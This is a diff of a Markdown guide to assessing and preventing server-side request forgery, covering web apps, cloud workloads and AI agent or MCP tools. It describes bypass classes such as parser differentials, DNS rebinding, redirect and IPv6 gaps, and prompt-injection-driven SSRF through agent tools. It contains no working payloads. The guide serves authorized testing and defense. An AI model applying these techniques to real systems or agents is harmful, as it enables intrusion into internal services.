-
-- Does the HTTP client resolve the hostname again after the policy check?
-- Does a custom dispatcher, agent, proxy, or SDK override the transport that was pinned?
-- Does the library prefer IPv6 after an IPv4-only check, or vice versa?
-- Can connection pooling reuse a socket created under another destination decision?
-- Does a retry or fallback use a different resolver or connector?
-- Is the peer address observable and checked against the approved set?
-
-### 7.3 Safe validation
-
-Use a controlled DNS fixture and a mock or local connector. Simulate a change in answers between the policy decision and the attempted connection. Assert that the connector can use only the approved address and that any changed or unapproved answer is rejected. Do not use a live third-party network or a production internal destination to test rebinding.
-
----
-
-## 8. Redirects, retries, and path changes
-
-Every redirect is a new destination decision.
-
-### 8.1 Review
-
-- Automatic redirect behavior in the client and SDK.
-- Relative and absolute `Location` handling.
-- Scheme, host, port, and origin changes.
-- Redirects across HTTP and HTTPS.
-- Redirects that change request method or body semantics.
-- Credential, cookie, and authorization-header forwarding across origins.
-- Hop limits and loops.
-- Retries and fallback transports that skip the original policy layer.
-- Redirects inside browser tools, document loaders, MCP tools, and agent adapters.
-
-### 8.2 Secure behavior
-
-- Disable automatic redirects when the feature does not require them.
-- When redirects are required, handle them manually.
-- Parse, resolve, classify, and authorize every `Location` before following it.
-- Apply the same DNS and connection-pinning policy to each hop.
-- Enforce a small hop limit and a total request budget.
-- Strip credentials and sensitive headers when origin changes, according to the application’s authentication design.
-- Do not allow an alternate retry path to bypass the guarded transport.
-
-### 8.3 Verified case patterns
-
-- CodeWhale / DeepSeek TUI CVE-2026-45310: the initial URL was checked, but the HTTP client followed redirects without repeating the restricted-destination policy. The advisory identifies 0.8.22 as the fixed release.
-- LangChain Community CVE-2026-27795: a redirect path bypassed the earlier `RecursiveUrlLoader` destination protections; the advisory identifies 1.1.18 as the patched release.
-
-These cases show why initial-URL validation is not equivalent to end-to-end destination enforcement.
-
----
-
-## 9. Proxies, tunnels, and egress layers
-
-The application may validate one destination while a proxy, service mesh, or custom transport connects to another.
-
-Review:
-
-- HTTP CONNECT and forward-proxy behavior.
-- SOCKS local-vs-remote DNS resolution.
-- Environment-derived proxy configuration.
-- Proxy-side resolution and destination ACLs.
-- Service-mesh egress gateways.
-- Custom Node `http.Agent` and `undici` dispatcher behavior.
-- Custom Go `RoundTripper` and dialer behavior.
-- Rust connector and resolver hooks.
-- Proxy bypass rules and direct fallback.
-- Connection pooling across proxy routes.
-- HTTP/2 and HTTP/3 connection reuse where origin coalescing or transport routing can affect policy.
-
-The policy must be enforced at the actual egress point as well as in application code. A proxy error must not trigger a less restricted direct connection. Collect logs from the final egress enforcement point in the authorized test environment.
-
----
-
-## 10. Browser, PDF, SVG, and document-rendering fetches
-
-A renderer can make many requests after the initial URL has been accepted.
-
-Inventory:
-
-- Main-frame navigation.
-- Images, stylesheets, fonts, scripts, iframes, media, and CSS imports.
-- SVG external references and XML resource resolution.
-- PDF and office-document conversion.
-- Downloads, service workers, speculative connections, and client-side navigation.
-- Browser automation tools that expose navigation, screenshot, evaluation, or download operations.
-- Subresources requested by embedded documents and templates.
-
-Defensive requirements:
-
-- Apply egress policy to every browser-originated request, not only the top-level navigation.
-- Run renderers in isolated workers without sensitive internal network access.
-- Disable unnecessary protocols and external resource loading.
-- Bound execution time, request count, response size, and recursion depth.
-- Avoid passing raw screenshots or rendered documents containing internal content to a requester or downstream model.
-- Keep browser navigation, screenshot, and evaluation privileges separate where possible.
-
-A top-level URL check does not prove that subresource requests are safe.
-
----
-
-## 11. Second-order and asynchronous SSRF
-
-A URL may be stored now and fetched later by a different worker or service identity.
-
-Review:
-
-- Stored avatar and attachment URLs.
-- Import and thumbnail queues.
-- Webhook delivery and verification jobs.
-- Scheduled reports, crawlers, and reprocessing pipelines.
-- Retry and dead-letter queues.
-- Background agent jobs and deferred tool calls.
-- Tenant or permission changes between submission and execution.
-
-Requirements:
-
-- Re-evaluate destination policy when the fetch actually runs.
-- Record the worker identity, tenant, job ID, and egress decision.
-- Ensure queue consumers use the same guarded transport as synchronous endpoints.
-- Expire or revalidate stored URLs when policy or ownership changes.
-- Bound retry count and job lifetime.
-- Do not assume validation at submission remains valid at execution time.
-
-For safe proof, use a harmless controlled callback and correlate it with the job ID and worker logs.
-
----
-
-## 12. Non-HTTP protocols and parser side effects
-
-Some libraries and document processors support schemes or resource handlers beyond ordinary HTTP(S).
-
-Review the protocol surface of the actual dependency stack, including:
-
-- file and local-resource handlers;
-- FTP and legacy handlers;
-- XML external entities and external document references;
-- archive and media library URL handlers;
-- custom SDK schemes;
-- browser custom protocols and embedded-resource handlers.
-
-Design rules:
-
-- Allow only the protocols required by the feature.
-- Reject unknown schemes before dispatch.
-- Disable external-entity resolution and remote resource loading by default.
-- Separate filesystem access from network access.
-- Run parsers and converters without ambient access to sensitive files or networks.
-- Test scheme handling in a local, isolated fixture.
-
-Do not treat a URL validator for HTTP(S) as a complete control over every protocol a downstream library may support.
-
----
-
-## 13. AI agents, MCP, and indirect prompt injection
-
-Agentic applications create a confused-deputy risk: a model may select a network-capable tool and construct its arguments using untrusted content. The model is not the authorization boundary.
-
-### 13.1 Map the full chain
-
-```text
-untrusted content
-  -> model context
-  -> tool selection
-  -> tool arguments
-  -> tool adapter
-  -> mandatory guarded transport
-  -> network
-  -> response consumer or next tool
-```
-
-### 13.2 Tool inventory
-
-| Tool class | Review focus |
-|---|---|
-| Direct fetch | Arbitrary URL or host reaches an HTTP client |
-| Browser navigation | Main-frame and subresource policy; screenshot/evaluation permissions |
-| Document ingestion | Parser and loader make hidden secondary requests |
-| Search connector | Provider URL, base URL, crawler, or result enrichment fetch |
-| Workflow HTTP node | Stored destinations and delayed worker execution |
-| MCP discovery | Metadata and remote configuration may influence later connections |
-| Code execution | Network-capable modules, sockets, or browser APIs exposed to scripts |
-| LLM media loader | User-controlled media references are fetched by inference infrastructure |
-
-### 13.3 Distinct trust boundaries
-
-- Direct user prompt vs. indirect instructions embedded in a page, file, email, or RAG chunk.
-- UI validation vs. tool-adapter validation.
-- Tool-adapter validation vs. underlying HTTP-client behavior.
-- One tool's output becoming another tool's URL or destination argument.
-- Connection-time policy vs. redirect handling inside the tool's client.
-- User identity vs. privileged service identity.
-- Synchronous session vs. background agent job.
-
-### 13.4 Assessment method
-
-- Inventory every tool that can cause network access, including tools not named `fetch`.
-- Review tool schemas for URL, host, endpoint, callback, media URL, and base-URL arguments.
-- Trace model-generated arguments into the adapter and network client.
-- Confirm that the adapter cannot bypass the centrally enforced destination policy.
-- Review tool chaining and response handling for privilege amplification.
-- Verify invocation logs, trace IDs, tenant, service identity, and egress records. Do not rely on model text claiming a tool was used.
-- Use a harmless prompt-injection canary that requests a call only to a researcher-controlled endpoint. Do not ask an agent to access private services or secrets.
-- Confirm that the model cannot grant itself permissions the user does not possess.
-
-### 13.5 MCP-specific checks
-
-- Is the MCP server authenticated where the deployment requires authentication?
-- Are remote server metadata and endpoint changes treated as untrusted configuration?
-- Are tools constrained by the same egress policy as the parent application?
-- Can a tool follow redirects or perform hidden secondary fetches?
-- Does an MCP client expose network, filesystem, or browser capabilities to untrusted servers?
-- Are server discovery and connection tests subject to the same destination controls as normal tool calls?
-- Is tool output treated as untrusted before it is used as a new tool argument?
-
-### 13.6 Important recent lesson
-
-A November 11, 2026 MCP `mcp-server-fetch` advisory documents an IPv6 site-local classification gap in a destination guard. The advisory explicitly rates practical reachability as low on default hosts and does not establish a general metadata-service compromise. Treat it as a classifier regression example, not proof that every installation is exploitable.
-
----
-
-## 14. LLM inference, media loading, and RAG
-
-An inference API may fetch media or documents before the model processes them. This creates an SSRF sink even when the application does not expose a conventional fetch tool.
-
-Review:
-
-- Vision-language `image_url` inputs.
-- Audio and video URL inputs.
-- Remote PDF and document references.
-- `load_image`, `load_audio`, `load_video`, and document-loader helpers.
-- Embedding pipelines that fetch remote pages before chunking.
-- Search connectors and web crawlers used during retrieval.
-- Tool-generated URLs passed into inference or document-processing services.
-
-Controls:
-
-- Treat all remote media references as untrusted destinations.
-- Apply scheme, address, DNS, connection, redirect, and egress policy in the media-fetch service.
-- Keep model inference credentials separate from media-fetch privileges.
-- Bound download size, content type, decompression, and processing time.
-- Do not return raw upstream responses or internal documents through model summaries.
-- Use local fixtures to test media fetching and response propagation.
-
-**Verified case:** LMDeploy CVE-2026-33626 affected the vision-language image-loading path; the NVD record identifies 0.12.3 as the fixed version. This illustrates why media loaders belong in the sink inventory.
-
----
-
-## 15. API schemas, GraphQL, and integrations
-
-A schema can reveal hidden fetch behavior even when the UI does not expose a URL field.
-
-Review:
-
-- GraphQL mutations and input objects containing URL-like fields.
-- Remote asset import operations.
-- Webhook, callback, and notification destinations.
-- OpenAPI/action importers.
-- Integration builders and configurable base URLs.
-- API gateways that derive a destination from headers or tenant configuration.
-- Fields that accept a host separately from path, scheme, or port.
-
-Trace each field to its actual outbound sink. Validate the destination at execution time and apply the same policy to imported, stored, and user-supplied configurations.
-
----
-
-## 16. Cloud, containers, and workload identity
-
-The most important cloud question is not simply whether a fetcher can contact a metadata service. It is which network boundaries and identities the fetcher can reach, and whether those privileges exceed the initiating user's permissions.
-
-Review defensively:
-
-| Environment | Review focus |
-|---|---|
-| AWS EC2 | IMDS configuration, IMDSv2 enforcement, hop limit, role permissions, and workload egress policy |
-| AWS ECS / Fargate | Task-role scope and container metadata boundaries |
-| AWS Lambda | Execution-role scope, environment-secret handling, file/protocol handlers, and outbound controls; do not assume EC2-style IMDS applies |
-| Google Cloud | Metadata protections, service-account/workload identity scope, and Cloud Run egress controls |
-| Azure | Managed-identity permissions and metadata protections |
-| Kubernetes | Pod egress, service-account privileges, controller/operator permissions, admission and webhook trust boundaries |
-| Serverless / edge | Runtime identity, environment access, network policy, and SDK-specific URL handling |
-| Service mesh | Egress gateway policy, workload identity, proxy bypass, and route consistency |
-
-Use cloud configuration evidence, policy review, synthetic fixtures, and owner-supplied logs. Do not fetch live metadata or retrieve credentials as proof.
-
----
-
-## 17. Language and transport review matrix
-
-The main question is whether the validator, resolver, proxy, and connector agree on the destination.
-
-| Ecosystem | Components to review | Frequent review concern |
+| Level | Observation | What it actually proves |
 |---|---|---|
-| JavaScript / TypeScript | WHATWG `URL`, `fetch`, Node HTTP clients, `undici`, agents and dispatchers | Different parser/dispatcher paths; redirects and custom dispatcher behavior |
-| Python | `urllib.parse`, `requests`, `httpx`, `aiohttp`, `urllib3`, `ipaddress`, socket resolution | Parser differences; DNS re-resolution; library-specific address classification |
-| Go | `net/url`, `net/http`, `net.Dialer`, `RoundTripper`, resolver configuration | Custom dialers and redirect policy |
-| Java | `URI`, `URL`, `HttpClient`, Apache HttpComponents | Parser and normalization differences; proxy configuration |
-| .NET | `System.Uri`, `HttpClient`, `SocketsHttpHandler` | Handler-level connection and proxy behavior |
-| Rust | `url`, `reqwest`, `hyper`, resolver and connector configuration | Redirect policy and IPv6 classification/normalization |
-| PHP | `parse_url`, cURL, stream wrappers, framework clients | Scheme handlers and wrapper defaults |
-| Ruby | `URI`, `Net::HTTP`, Faraday, Addressable | Parser behavior and adapter-specific transport behavior |
+| E0 — Reflection | Your value appears in a response/error | Input reflection only — not SSRF by itself |
+| E1 — DNS | Your unique hostname resolves (DNS hit on Collaborator/interactsh) | Something resolved the hostname; HTTP fetch is *not* proven yet |
+| E2 — HTTP callback | Your controlled endpoint gets an attributable HTTP hit | An HTTP-capable component made the outbound request |
+| E3 — Response propagation | A marker from your controlled response reaches you back | Full-read SSRF — response propagation confirmed |
+| E4 — Policy failure demonstrated | A restricted address/hostname you expected to be blocked is actually reached | Destination enforcement genuinely fails, not just "theoretically could" |
+| E5 — Boundary/identity effect | You get cross-tenant data, a different service's credentials, or privilege you shouldn't have | The specific authorization boundary is broken |
 
-Do not assume that two APIs in the same language share parsing or transport semantics. Inspect the exact version and configuration in use.
+**Insufficient on their own, don't report yet:** a validator merely accepting your string, a status-code/timing change with no independent attribution, a tool/agent *claiming* it fetched something, a DNS event you can't tie to your specific test input, or a callback with no unique per-test identifier. These read like evidence but aren't — get to at least E2 (ideally E3+) before writing anything up.
 
----
+## 3.6 Non-HTTP protocol and parser side-effect checklist
 
-## 18. Controlled validation playbook
+Beyond gopher (Part 2 §13), check what protocols the actual fetch library supports, not just what the feature's UI implies:
+- `file://` and local-resource handlers (local file read via a feature that only looks like it does HTTP)
+- legacy `ftp://` handlers
+- XML external entities / external document references (XXE escalating straight into SSRF)
+- archive and media-library URL handlers that fetch nested resources
+- custom SDK schemes and browser custom-protocol/embedded-resource handlers
 
-Use the following workflow in an isolated lab, a dedicated test tenant, or owner-approved staging. The fixtures must be under the tester's or asset owner's control.
+A validator that only checks `http(s)://` doesn't mean the underlying library can't be reached with another scheme — test scheme handling explicitly as its own axis, separate from host/IP bypasses.
 
-### Phase 0 — Engagement setup
+## 3.7 Expanded agentic/MCP tool inventory (complements Part 1 §1.1 and Part 2 §4–5)
 
-- Record in-scope hostnames, applications, tools, accounts, and tenants.
-- Record prohibited test classes and rate limits from the engagement rules.
-- Choose the controlled callback service and local fixture environment.
-- Define the request ID format and the stop condition.
-- Identify who can provide staging logs and confirm egress events.
+When the target is agentic, inventory every tool that can cause network access, not just ones literally named `fetch`:
 
-### Phase 1 — Surface mapping
-
-- Enumerate URL-taking features and hidden import/render workflows.
-- Enumerate MCP, agent, RAG, media-loading, and workflow tools.
-- Inspect API schemas, GraphQL input types, MCP schemas, and frontend request construction.
-- Search source for outbound clients, URL parsers, resolvers, and security wrappers.
-- Build the sink inventory.
-
-### Phase 2 — Data-flow reconstruction
-
-For each sink:
-
-- Trace the input to the connector.
-- Record every parser and transformation.
-- Identify validation and authorization decisions.
-- Identify DNS, redirect, proxy, retry, and pooling behavior.
-- Identify response exposure and asynchronous execution.
-- Record the runtime identity and tenant.
-
-### Phase 3 — Harmless attribution
-
-- Verify the controlled callback service independently.
-- Generate one unique, unpredictable identifier per candidate sink.
-- Submit one candidate at a time.
-- Correlate callback timestamp, request ID, account, tenant, and application logs.
-- For agentic paths, correlate the tool invocation ID and model trace with egress logs.
-- Run a negative control.
-- Repeat only when necessary to rule out unrelated background traffic.
-
-### Phase 4 — Policy regression tests in a lab
-
-Build a local matrix that covers:
-
-| Test family | Fixture | Expected secure result |
-|---|---|---|
-| URL syntax | Valid, malformed, ambiguous, and unsupported test URLs | Reject ambiguity and unsupported schemes |
-| Parser parity | Same corpus through validator and transport parser | Normalized destination must match |
-| Origin checks | Same-origin and different-origin fixtures | Compare structured origins, not string prefixes |
-| Address policy | Synthetic IPv4 and IPv6 classification corpus | Every prohibited class rejected |
-| Mixed DNS answers | Controlled A/AAAA fixtures | No unapproved address can be selected |
-| DNS change | Controlled resolver changes answer between phases | Connector remains pinned or request is denied |
-| Redirects | Local redirect server with several controlled hops | Every hop gets a new policy decision |
-| Proxy | Local test proxy and direct-connection fallback simulation | No unguarded route is selected |
-| Retry | Mock connector returns retryable errors | Retry cannot bypass policy |
-| Browser resources | Local HTML page with controlled subresources | Every subresource is subject to egress policy |
-| Document parsing | Local SVG/XML/PDF fixtures | No uncontrolled remote resource loads |
-| Async worker | Local queue and worker | Policy is rechecked at execution time |
-| Agent tool | Test agent invokes a controlled callback tool | Tool identity and egress event are correlated |
-| Tool chaining | Controlled tool output passed to a second mock tool | Each invocation is independently authorized |
-| Media loader | Local image/audio/document fixture | Loader uses the guarded fetch service |
-
-Do not turn this matrix into live internal-network probing. The goal is to prove that the implementation enforces its policy, not to enumerate private services.
-
-### Phase 5 — Impact assessment
-
-Answer only what the evidence supports:
-
-- Can the input influence a server-side request?
-- Is the request attributable to the tested sink?
-- Does the connection pass through the intended policy layer?
-- Is a policy decision incorrect in the controlled fixture?
-- Does any harmless fixture response reach the caller or a downstream tool?
-- Is the behavior cross-tenant or executed under a more privileged service identity?
-- Is the observed impact only an outbound request, or is response content exposed?
-
-Do not infer secret access, internal compromise, or code execution from a callback alone.
-
-### Phase 6 — Report and regression
-
-- Provide the smallest reproducible request using the controlled canary.
-- Include request ID, timestamp, callback event, and relevant logs.
-- Include the exact sink and source-to-sink trace.
-- State the observed impact and the impact not tested.
-- Identify the broken invariant and systemic remediation.
-- Add a regression test for the root cause.
-
----
-
-## 19. Evidence and confidence model
-
-| Evidence level | Observation | What it proves |
-|---|---|---|
-| E0 — Reflection | Submitted value appears in output | Input reflection only |
-| E1 — DNS | Unique controlled hostname is resolved | A resolver or intermediary handled the hostname; HTTP fetch is not proven |
-| E2 — HTTP callback | Controlled endpoint receives an attributable request | An HTTP-capable component made an outbound request |
-| E3 — Synthetic response | A harmless marker from a controlled response reaches the caller | Response propagation is established |
-| E4 — Policy failure in fixture | Local/owner-controlled restricted fixture is reached despite policy | Destination enforcement failed in the tested environment |
-| E5 — Boundary/identity effect | Owner-approved synthetic evidence shows a cross-tenant or privilege boundary failure | The specific authorization boundary is affected |
-
-Evidence that is insufficient by itself:
-
-- URL reflection or a validator accepting a string.
-- A response code change without independent attribution.
-- A request taking longer than expected.
-- A model claiming that it fetched a URL.
-- A tool error interpreted as proof of success.
-- A DNS event that cannot be tied to the tested input.
-- A callback generated by the researcher's own browser or proxy.
-- A callback without a unique test identifier or tenant correlation.
-
-A DNS-only result is not equivalent to an HTTP fetch. An HTTP callback is not equivalent to response disclosure. Response disclosure is not automatically equivalent to credential compromise.
-
----
-
-## 20. Severity and reportability
-
-Severity depends on exploit preconditions, attacker privileges, destination policy, reachable trust boundary, response exposure, service identity, tenant separation, and realistic impact.
-
-| Evidence | Suggested interpretation |
+| Tool class | What to check |
 |---|---|
-| Reflection only | Not SSRF |
-| DNS-only interaction | Resolver interaction; investigate attribution |
-| Controlled HTTP callback | Confirmed outbound request; impact remains unproven |
-| Controlled response marker returned | Read-capable fetch behavior demonstrated against the controlled endpoint |
-| Controlled policy failure | Destination policy is ineffective in the tested fixture |
-| Cross-tenant synthetic result | Authorization boundary issue; assess affected roles and tenants |
-| Live sensitive material appears unexpectedly | Stop, do not retain or use it, and notify the owner through the approved channel |
+| Direct fetch tool | Arbitrary URL/host reaches an HTTP client with no re-validation |
+| Browser navigation tool | Main-frame AND subresource policy; screenshot/evaluation permissions separate from navigation |
+| Document ingestion / RAG loader | Parser makes hidden secondary requests (remote images, XML includes) while "just" converting a doc |
+| Search connector | Is the provider/base URL itself attacker-influenceable? |
+| Workflow HTTP node | Stored destination + delayed worker execution — re-validated at run time or only at save time? |
+| MCP server discovery/config | Does changing remote server metadata influence later connections? |
+| Code-execution tool | Does the sandbox expose sockets/`requests`/`fetch` to generated code? |
+| LLM media loader | `image_url`/`audio_url`/document references fetched by inference infra itself, before the model ever "does" anything |
 
-Do not assign a critical severity merely because an internal destination is theoretically reachable. Do not downgrade a cross-tenant or privileged-service issue solely because it is blind. Explain preconditions and evidence separately.
+Distinct trust boundaries worth testing independently: direct prompt vs. indirect instructions buried in a page/file/email/RAG chunk (prompt-injection-driven SSRF); UI validation vs. tool-adapter validation; one tool's output becoming a second tool's URL argument (tool chaining); your account's identity vs. a more privileged agent/service identity performing the actual fetch.
 
----
+## 3.8 More verified 2025–2026 CVEs/advisories (add to Part 2's case list)
 
-## 21. Remediation architecture
+| Reference | Root-cause lesson |
+|---|---|
+| CVE-2026-45310 — CodeWhale/DeepSeek TUI | Initial URL was checked, but the client followed redirects without re-applying the destination policy (same pattern as Part 2 §8/§10's redirect gap) |
+| CVE-2026-33626 — LMDeploy | Vision-language `image_url` loading path fetched remote URLs without adequate destination validation — confirms Part 1's "LLM media loader" sink class is real-world exploitable |
+| CVE-2026-50168 — Angular `platform-server` | WHATWG `URL` and the lenient Domino parser disagreed during SSR, causing an allowlist bypass — textbook parser differential (Part 2 §3) |
+| CVE-2026-26019 / CVE-2026-27795 — LangChain Community | Same-origin check used string-prefix comparison (Part 2 §5's `startsWith()` bypass) and a later fix was itself bypassed via redirects |
+| CVE-2026-48737 — pyLoad-ng | Global-address classifier missed IPv6 transition-address cases — same class as Part 2 §1 (NAT64/6to4), reachability depends on the host's NAT64/6to4 routing |
+| CVE-2026-57126 — PraisonAI | Literal-host checks ran before hostname resolution, leaving DNS-based destination validation incomplete |
+| GHSA-3rxj-6jhw-qfv7 — MCP `mcp-server-fetch` (2026-11-11) | IPv6 site-local (`fec0::/10`) classification gap in the fetch guard; note the advisory itself rates practical reachability as low on default hosts — don't overclaim this one without independent reachability evidence |
 
-A robust outbound-fetch service should:
+**Research hygiene:** always reopen the vendor advisory before citing affected/fixed versions in a live report — CNA, NVD, and vendor release notes can disagree, and advisory details get superseded.
 
-1. Accept structured destinations or narrowly defined resource identifiers where practical, rather than arbitrary URL strings.
-2. Permit only required schemes, ports, and hosts.
-3. Parse and canonicalize once using a well-maintained parser.
-4. Reject ambiguous or malformed inputs.
-5. Compare origins structurally; never rely on string-prefix checks.
-6. Resolve the complete relevant address set.
-7. Classify addresses against a current, versioned policy based on IANA registries and deployment needs.
-8. Normalize embedded IPv4 representations before comparison.
-9. Pin the approved address at the actual dial/connect layer.
-10. Preserve correct hostname semantics for HTTP Host and TLS certificate verification.
-11. Revalidate every redirect, retry destination, and fallback route.
-12. Apply equivalent policy to proxies, tunnels, service meshes, and browser requests.
-13. Disable unused protocols and automatic redirects.
-14. Bound connection time, total duration, response bytes, redirects, and concurrency.
-15. Isolate document renderers and browser workers from sensitive internal networks.
-16. Run fetch workers with least-privilege identities.
-17. Recheck policy when background jobs execute.
-18. Avoid returning raw upstream bodies or headers unless explicitly required.
-19. Log the policy decision, normalized destination, resolved address, selected peer, redirect hop, request ID, tenant, and tool identity without logging secrets.
-20. Make the guarded transport mandatory for application modules, plugins, MCP tools, and agent adapters.
-21. Add static or architectural checks that prevent direct unguarded HTTP clients from being introduced.
-22. Add regression tests for every parser, DNS, redirect, proxy, and identity failure that has been fixed.
+## 3.9 Address-classification details worth remembering (complements Part 2 §1–2)
 
-### Architecture tests that should always pass
-
-- Every outbound request goes through the approved transport.
-- The transport connects only to an address approved by the destination policy.
-- The connected peer matches the approved address set.
-- All A and AAAA results are handled consistently.
-- IPv4-embedded IPv6 representations receive explicit policy treatment.
-- Redirect targets are independently authorized.
-- DNS, parsing, and policy failures fail closed.
-- Proxy routes and direct routes enforce equivalent policy.
-- Browser subresources and document renderers cannot bypass egress policy.
-- Background workers re-evaluate destinations at execution time.
-- Model-generated URLs receive the same validation as user-submitted URLs.
-- Every MCP and agent tool uses the same mandatory network boundary.
-- A new network sink cannot be introduced without a corresponding policy test.
+- A hostname can resolve to a mix of public and non-public A/AAAA answers — policy must evaluate the *complete* answer set, not approve the hostname just because one answer looked public.
+- The core TOCTOU bug: the app checks one resolved address, then the HTTP stack resolves the hostname *again* at connect time. A correct implementation pins the already-approved address to the actual connect call rather than re-resolving — when you see a guard that does "DNS check, then pass the hostname to a normal HTTP client," that's a strong signal a DNS-rebinding or redirect-based (Part 2 §8/§14) bypass is possible.
 
 ---
 
-## 22. Report template
+## How to use this during an engagement
 
-```markdown
-# SSRF in [feature / tool] through [input field]
-
-## Summary
-[Describe the user-controlled or model-generated input, the server-side fetch,
-and the policy boundary that failed.]
-
-## Affected asset
-- Host / application:
-- Endpoint / feature / tool:
-- Account role:
-- Tenant:
-- Runtime / worker / agent identity:
-- Environment:
-
-## Root cause
-- Input source:
-- Fetch sink and library:
-- Parser / canonicalization path:
-- Destination policy:
-- DNS and connection behavior:
-- Redirect / retry / proxy behavior:
-- Response behavior:
-
-## Reproduction
-1. State the minimum authorized setup.
-2. Submit the controlled canary with a unique identifier.
-3. Show the matching callback and application/egress event.
-4. Include request ID and timestamp.
-5. Include the negative control.
-
-## Observed impact
-[State only what was directly demonstrated.]
-
-## Security implications
-[Explain the trust boundary and realistic preconditions without claiming
-unverified data access or compromise.]
-
-## Remediation
-[Describe the shared control that prevents this failure across all sinks.]
-
-## Limitations
-[List destinations, protocols, roles, tools, and impact paths not tested.]
-```
-
----
-
-## 23. Verified research notes (checked 2026-11-18)
-
-The cases below are examples of root-cause patterns, not a payload collection. Always reopen the vendor advisory before using affected/fixed-version information in a live assessment.
-
-| Reference | Root-cause lesson | Source |
-|---|---|---|
-| **CVE-2026-45310 — CodeWhale / DeepSeek TUI** | Initial destination validation did not cover automatic redirect targets. The NVD record identifies 0.8.22 as fixed. | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-45310) · [GitHub advisory](https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-96ff-gc8g-wpvg) |
-| **CVE-2026-33626 — LMDeploy** | Vision-language image loading accepted remote URLs without adequate destination validation. The NVD record identifies 0.12.3 as fixed. | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-33626) |
-| **CVE-2026-50168 — Angular platform-server** | WHATWG URL validation and the lenient Domino parser disagreed, creating an allowlist bypass in server-side rendering. | [GitHub advisory](https://github.com/advisories/GHSA-xrxm-cp7j-8xf6) · [Tenable summary](https://www.tenable.com/cve/CVE-2026-50168) |
-| **CVE-2026-26019 — LangChain Community** | Same-origin enforcement used string-prefix comparison and did not adequately classify private/reserved destinations. | [GitHub advisory](https://github.com/advisories/GHSA-gf3v-fwqg-4vh7) · [GitLab advisory](https://advisories.gitlab.com/npm/%40langchain/community/CVE-2026-26019/) |
-| **CVE-2026-27795 — LangChain Community** | Redirect following bypassed the earlier `RecursiveUrlLoader` protection; advisory identifies 1.1.18 as patched. | [CVE record](https://www.cve.org/CVERecord?id=CVE-2026-27795) · [GitHub advisory](https://github.com/advisories/GHSA-mphv-75cg-56wg) |
-| **CVE-2026-48737 — pyLoad-ng** | A generic global-address classification missed IPv6 transition-address cases. The advisory notes reachability depends on NAT64/6to4 routing and lists no patched version at publication. | [GitHub advisory](https://github.com/advisories/GHSA-m5x5-28jr-gpjj) |
-| **CVE-2026-57126 — PraisonAI** | Literal-host checks did not resolve hostnames before fetch operations, leaving DNS destination validation incomplete. Verify affected/fixed release details against the vendor record. | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-57126) |
-| **GHSA-3rxj-6jhw-qfv7 — MCP `mcp-server-fetch`** | Published 2026-11-11; an IPv6 site-local classification gap in the fetch guard. No CVE was assigned in the advisory, and practical reachability is explicitly limited on default hosts. | [GitHub advisory](https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-3rxj-6jhw-qfv7) · [2026-11-11 release notes](https://github.com/modelcontextprotocol/servers/releases) |
-| **CVE-2025-64709 — Typebot** | Custom-header handling in a webhook fetch flow affected the IMDSv2 protection boundary. This is a reminder to review request-method and header capabilities as well as destination checks. | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-64709) |
-
-### Research hygiene notes
-
-- The uploaded v3 reference shelf contained entries whose identifiers or descriptions were not substantiated during this update. They were not copied forward as confirmed facts.
-- In particular, do not reuse the original `CVE-2026-2020` or `CVE-2026-61430` labels without locating a primary advisory that supports the exact product and root cause.
-- The original Angular entry conflated a real parser-differential issue with an incorrect CVE identifier. The verified parser-differential case is **CVE-2026-50168**.
-- Broad prevalence percentages about MCP servers were omitted because the underlying sampling method and representativeness were not established from a primary source.
-- CVE publication, advisory update, affected-version, and fixed-version data can differ between the CNA, NVD, and vendor release. Prefer the vendor advisory for remediation and record any discrepancy.
-
----
-
-## 24. Reference shelf
-
-### Prevention and standards
-
-- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
-- [OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html)
-- [IANA IPv4 Special-Purpose Address Registry](https://www.iana.org/assignments/iana-ipv4-special-registry)
-- [IANA IPv6 Special-Purpose Address Registry](https://www.iana.org/assignments/iana-ipv6-special-registry)
-- [RFC 6890 — Special-Purpose IP Address Registries](https://www.rfc-editor.org/rfc/rfc6890)
-- [RFC 6052 — IPv6 Addressing of IPv4/IPv6 Translators](https://www.rfc-editor.org/rfc/rfc6052)
-- [RFC 8215 — Local-Use IPv4/IPv6 Translation Prefix](https://www.rfc-editor.org/rfc/rfc8215)
-- [RFC 3879 — Deprecating Site Local Addresses](https://www.rfc-editor.org/rfc/rfc3879)
-- [WHATWG URL Standard](https://url.spec.whatwg.org/)
-- [RFC 3986 — URI Generic Syntax](https://www.rfc-editor.org/rfc/rfc3986)
-
-### Vulnerability advisories
-
-- [CVE-2026-45310 — CodeWhale redirect handling](https://nvd.nist.gov/vuln/detail/CVE-2026-45310)
-- [CVE-2026-33626 — LMDeploy media loading](https://nvd.nist.gov/vuln/detail/CVE-2026-33626)
-- [CVE-2026-50168 — Angular parser differential](https://github.com/advisories/GHSA-xrxm-cp7j-8xf6)
-- [CVE-2026-26019 — LangChain URL-origin validation](https://github.com/advisories/GHSA-gf3v-fwqg-4vh7)
-- [CVE-2026-27795 — LangChain redirect handling](https://github.com/advisories/GHSA-mphv-75cg-56wg)
-- [CVE-2026-48737 — pyLoad IPv6 transition classification](https://github.com/advisories/GHSA-m5x5-28jr-gpjj)
-- [CVE-2026-57126 — PraisonAI hostname validation](https://nvd.nist.gov/vuln/detail/CVE-2026-57126)
-- [GHSA-3rxj-6jhw-qfv7 — MCP fetch IPv6 site-local classification](https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-3rxj-6jhw-qfv7)
-- [CVE-2025-64709 — Typebot webhook/IMDSv2 boundary](https://nvd.nist.gov/vuln/detail/CVE-2025-64709)
-
----
-
-## 25. Final decision rule
-
-A high-quality SSRF finding must answer these questions with evidence:
-
-1. **Control:** Which exact input controls the outbound request?
-2. **Attribution:** What proves that this input caused the observed request?
-3. **Sink:** Which process, library, tool, worker, or proxy performed it?
-4. **Boundary:** Which destination or authorization boundary was affected in the controlled environment?
-5. **Exposure:** What response or effect was actually observable?
-6. **Consistency:** Did parser, policy, resolver, proxy, and connector agree on the same destination?
